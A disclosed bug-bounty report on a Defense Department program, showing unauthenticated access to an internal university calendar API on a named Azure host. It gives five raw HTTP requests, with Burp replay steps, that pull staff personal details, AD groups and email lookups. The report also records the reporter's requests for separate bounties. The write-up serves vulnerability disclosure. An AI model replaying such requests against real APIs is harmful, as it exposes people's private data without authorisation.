---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authorization
  - env/web
substate: "resolved"
weakness: "Improper Authorization"
enriched: true
body: true
date: 2024-07-19
submitted: 2022-07-06T14:02:28.184Z
bounty_usd: null
votes: 13
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "matrixsoftsec"
source: "https://hackerone.com/reports/1627980"
title: "Unauthenticated access to internal API at██████████.███.edu  [HtUS]"
---
# Unauthenticated access to internal API at██████████.███.edu  [HtUS]

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 13 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2024-07-19

- Report: [https://hackerone.com/reports/1627980](https://hackerone.com/reports/1627980)
- CWE: Improper Authorization
- Submitted: 2022-07-06T14:02:28.184Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

#Overview:

* There are multiple API calls using which an attacker user is able to gain unauthenticated access to internal API████████.██████.edu via Azure API url appg3entcalapi.azurewebsites.net.  

* The access to█████.██████.edu is via microsoft and only allows internal users to access it.

* The appg3entcalapi.azurewebsites.net is listed as the API under the javascript located at [https://eventscalendar.████.edu/app.js](https://eventscalendar.██████.edu/app.js)

██████

#Steps to reproduce:

#(I) Vulnerable Request: Disclose PII of internal users-

```
GET /api/person/Default.GetAllPersons HTTP/1.1
Host: appg3entcalapi.azurewebsites.net
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 2

{}
```

* Copy the above vulnerable request to your BURP repeater tab and fire the request.

* Notice the 200 OK response disclosing the details.

██████████

#(II) Vulnerable Request: Disclose adgroups & internal emails-

```
GET /api/AdGroup HTTP/1.1
Host: appg3entcalapi.azurewebsites.net
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Content-Length: 2

{}
```

* Copy the above vulnerable request to your BURP repeater tab and fire the request.

* Notice the 200 OK response disclosing the details.

█████

#(III) Vulnerable Request:

```
GET /api/EventType HTTP/1.1
Host: appg3entcalapi.azurewebsites.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 2

{}
```

* Copy the above vulnerable request to your BURP repeater tab and fire the request.

* Notice the 200 OK response disclosing the details.

███████

## Impact

Unauthenticated access to internal API at████.████████.edu

## Timeline

- **Report Filed**
- **2022-07-06** @matrixsoftsec: Hi folks,

It appears that the whole API is not unauthenticated and that some of the API endpoints do require authentication, making this separate fixes in my opinion, let me know what you guys think!

Cheers,
@matrixsoftsec
- **2022-07-06** @matrixsoftsec: Hi team,

#Additional Info:

#(IV) Vulnerable Request: Disclose users via email:

```
GET /api/person/Default.GetPersonsByEmail(email='admin') HTTP/1.1
Host: appg3entcalapi.azurewebsites.net
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 2

{}
```

████████

#(V) Vulnerable Request: Disclose users via name:

```
GET /api/person/Default.GetPersonsByName(name='william') HTTP/1.1
Host: appg3entcalapi.azurewebsites.net
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 2

{}
```

████

**Like I said the whole API is not unauthenticated some of the API calls do require auth, some example screenshots below-**

██████████

████████
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2022-07-07** @matrixsoftsec: Hi @nutellatte,

Thanks for the bounty on this, but there were multiple API endpoints and the whole API is not unauthenticated making these separate endpoints, as separate fixes, what are your thoughts about this?
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
